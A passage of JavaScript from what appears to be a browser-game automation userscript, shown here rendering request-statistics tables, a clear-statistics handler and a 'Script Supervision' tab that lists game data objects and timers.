			 + '	<TD align=right>'+translate('Read Report')+' : </TD>'
			 + '	<TD align=right>'+Data.requests.reports_read.total + '</TD>'
			 + '	<TD align=right>'+perHour.intToCommas() + '/'+ translate('h')+ '</TD>'
			 + '	<TD align=right class=' + UID['bold_red'] + '>'+Data.requests.reports_read.errors + '</TD>'
			 + '</TR>';
			 
		// Reports Delete
		var perHour = Data.requests.reports_del.total / run_time;
		html += '<TR>'
			 + '	<TD align=right>'+translate('Delete')+' '+translate('Reports')+' : </TD>'
			 + '	<TD align=right>'+Data.requests.reports_del.total + '</TD>'
			 + '	<TD align=right>'+perHour.intToCommas() + '/'+ translate('h')+ '</TD>'
			 + '	<TD align=right class=' + UID['bold_red'] + '>'+Data.requests.reports_del.errors + '</TD>'
			 + '</TR>';
		
		// Separator
		html += '<TR>'
			 + '	<TD colspan=4>&nbsp;</TD>'
			 + '</TR>';
			 
		// Training
		var perHour = Data.requests.training.total / run_time;
		html += '<TR>'
			 + '	<TD align=right>'+translate('Training')+' : </TD>'
			 + '	<TD align=right>'+Data.requests.training.total + '</TD>'
			 + '	<TD align=right>'+perHour.intToCommas() + '/'+ translate('h')+ '</TD>'
			 + '	<TD align=right class=' + UID['bold_red'] + '>'+Data.requests.training.errors + '</TD>'
			 + '</TR>';

		// Research
		var perHour = Data.requests.research.total / run_time;
		html += '<TR>'
			 + '	<TD align=right>'+translate('Research')+' : </TD>'
			 + '	<TD align=right>'+Data.requests.research.total + '</TD>'
			 + '	<TD align=right>'+perHour.intToCommas() + '/'+ translate('h')+ '</TD>'
			 + '	<TD align=right class=' + UID['bold_red'] + '>'+Data.requests.research.errors + '</TD>'
			 + '</TR>';
		
		// Building
		var perHour = Data.requests.building.total / run_time;
		html += '<TR>'
			 + '	<TD align=right>'+translate('Building')+' : </TD>'
			 + '	<TD align=right>'+Data.requests.building.total + '</TD>'
			 + '	<TD align=right>'+perHour.intToCommas() + '/'+ translate('h')+ '</TD>'
			 + '	<TD align=right class=' + UID['bold_red'] + '>'+Data.requests.building.errors + '</TD>'
			 + '</TR>';
		
		// Separator
		html += '<TR>'
			 + '	<TD colspan=4>&nbsp;</TD>'
			 + '</TR>';
			 
		// Auto-Collect
		var perHour = Data.requests.collect.total / run_time;
		html += '<TR>'
			 + '	<TD align=right>'+translate('Auto-Collect')+' : </TD>'
			 + '	<TD align=right>'+Data.requests.collect.total + '</TD>'
			 + '	<TD align=right>'+perHour.intToCommas() + '/'+ translate('h')+ '</TD>'
			 + '	<TD align=right class=' + UID['bold_red'] + '>'+Data.requests.collect.errors + '</TD>'
			 + '</TR>';	 
		
		// Separator
		html += '<TR>'
			 + '	<TD colspan=4>&nbsp;</TD>'
			 + '</TR>';
			 
		// Totals
		var perHour = total_requests / run_time;
		html += '<TR>'
			 + '	<TD align=right><b>'+translate('Total')+' : </b></TD>'
			 + '	<TD align=right><b>'+total_requests + '</b></TD>'
			 + '	<TD align=right><b>'+perHour.intToCommas() + '/' + translate('h') +'</b></TD>'
			 + '	<TD align=right class=' + UID['bold_red'] + '><b>'+total_errors + '</b></TD>'
			 + '</TR>';

		html += '<TR>'
			 + '	<TD colspan=4>&nbsp;</TD>'
			 + '</TR>';

		html += '<TR>'
		   + '	<td align=right>'+ translate('Start Date') +' : </td>'
		   + '	<TD colspan=3>'+ new Date(Data.requests.start_at * 1000).myString() + '</TD>'
		   + '</TR>'
		   + '<TR>'
		   + '	<td align=right>'+ translate('Run Time') +' : </td>'
		   + '	<TD colspan=3>'+ timeFormat( Data.requests.run_time, true ) + '</TD>'
		   + '</TR>';
		
		html += '<TR>'
			 + '	<TD colspan=4>&nbsp;</TD>'
			 + '</TR>';

		html +='<TR>'
			+ '	<td colspan=4 align=center>'
			+ '		<input id='+ setUID('Tabs.Logs.tabStats.clear') +' type=button value="'+ translate('Delete') +' '+ translate('Statistics') +'" /></center>'
			+ '	</td>'
			+ '</TR>';
		html += '</TABLE>';

		$J(t.content[3]).html( html );
		
		$J('#'+UID['Tabs.Logs.tabStats.clear']).click( t.clearStats );
		
		t.stats_timer = setTimeout(t.tabStats, 1000);
	
	},

	//didi modif
	clearStats : function () {
		Data.requests.start_at = serverTime();
		
		for ( var type in Data.requests ){
			if ( Data.requests.hasOwnProperty( type ) && typeof Data.requests[type].total !== 'undefined') {
					Data.requests[type].total  = 0;
					Data.requests[type].errors = 0;
			}
		}
	},

	//didi moif : add supervision script
	tabSuper : function (){
		var t = Tabs.Logs;
		var html = '';
				
		$J('#'+UID[t.last_subtab])
		.css('z-index','0')
		.removeClass('selected');
		
		$J('#'+UID['Tabs.Logs.tabSuper'])
		.css('z-index','1')
		.addClass('selected');
		
		t.last_subtab = 'Tabs.Logs.tabSuper';
		
		$J(t.content[0]).parent().hide();
		$J(t.content[1]).parent().hide();
		$J(t.content[2]).parent().hide();
		$J(t.content[3]).parent().hide();
		$J(t.content[4]).parent().show();
		$J(t.content[5]).parent().hide();

		clearTimeout(t.stats_timer); t.stats_timer=null;
		clearTimeout(t.super_timer); t.super_timer=null;
		
		t.title.innerHTML = translate('Script Supervision');
		
		var Data_Super = [ 
			{name : 'Manifest.data', obj : Manifest.data},
			{name : 'Seed.requirements', obj : Seed.requirements },
			{name : 'Seed.stats', obj : Seed.stats },
			{name : 'Seed.cities', obj : Seed.cities},
			{name : 'Seed.generals', obj : Seed.generals},
			{name : 'Dragons.all_dragons', obj : Dragons.all_dragons},
			{name : 'Seed.player', obj : Seed.player},
			{name : 'Map.targets', obj : Map.targets},
			{name : 'Data.map.terrain', obj : Data.map.terrain},
			{name : 'Data.map.players',obj : Data.map.players},
			{name : 'Data.map.alliance',obj : Data.map.alliance},
			{ name : 'Seed.marches', obj : Seed.marches},
			{name : 'Data.marches.attacks', obj : Data.marches.attacks},
			{name : 'Data.marches.waves',obj : Data.marches.waves},
			{name : 'Seed.jobs', obj : Seed.jobs}
		];
		//for ( var i = 0 ; i < Seed.cities.length ; i++ ) {
		//	if (!Seed.cities[i]) continue;
		//	var obj = {name : 'Seed.jobs.'+Seed.cities[i].name, obj : Seed.jobs[Seed.cities[i].id]};
		//	Data_Super.push(obj);
		//}

		var Timers = [
			{name : 'Resources.tick' , timer : Resources.timer , check : true },
			{name : 'Seed.jobsTick' , timer : Seed.tickTimer, check : true },
			{name : 'AutoCollect' , timer : AutoCollect.timer , check : Data.options.auto_collect.enabled},
			{name : 'Marches Check', timer : Marches.checkTimer , check : true},
			{name : 'Waves Engine', timer : Tabs.Waves.timer.attack , check : Data.options.waves.enabled},
			{name : 'Attacks Engine', timer : Tabs.Attacks.timer.attack , check : Data.options.attacks.enabled},
			{name : 'Auto-Training Manager', timer : Tabs.Jobs.training.timer.tick , check : Data.options.training.enabled},
			{name : 'Auto-Resurrection Manager', timer : Tabs.Jobs.resurrection.timer.tick , check : Data.options.resurrection.enabled},
			{name : 'Auto-Building Manager', timer : Tabs.Jobs.building.timer.tick , check : Data.options.building.enabled},
			{name : 'Auto-Research Manager', timer : Tabs.Jobs.research.timer.tick , check : Data.options.research.enabled},
			{name : 'Alliance Auto Transport Manager', timer : Tabs.Alliance.transport.timer.auto_trsp , check : Data.options.alliance.auto_trsp.enabled},
			{name : 'Messages Check', timer : Messages.timers.fetch_list , check : true},
			{name : 'Delete Messages', timer : Messages.timers.delete_list , check : true}
		];
		
		for (var type in Messages.timers.fetch_next) {
			Timers.push({name : 'Read Msg '+type, timer : Messages.timers.fetch_next[type] , check : true});
		}
		
		html += '<table class="' + UID['table'] + ' zebra" style="margin-top:3px" width=100%>'
		+'	<tr>'
		+'		<th colspan=2>' + translate('Memory') + '</th>'
		+'	</tr>'
		+'	<tr valign=top align=left>'
		+'		<td width=100% >'; //style="border-right: 1px solid;"
		
		html += '<table class="' + UID['table'] + ' zebra" width=100%>'
		+'				<tr>'
		+'					<th>' + translate('Object')+'<BR>'+translate('Name') + '</th>'
		+'					<th>' + translate('Nb Level 0')+'<BR>'+translate(' entries') + '</th>'
		+'					<th>' + translate('Nb')+'<BR>'+translate(' Entries') + '</th>'
		+'					<th>' + translate('Size of')+'<BR>'+translate('Property')+'<BR>'+translate('Name') + '</th>'
		+'					<th>' + translate('Size of')+'<BR>'+translate('values') + '</th>'
		+'				</tr>';

		for ( var i = 0; i < Data_Super.length; i++)
		{
			var name = Data_Super[i].name;
			var size = sizeObj(Data_Super[i].obj);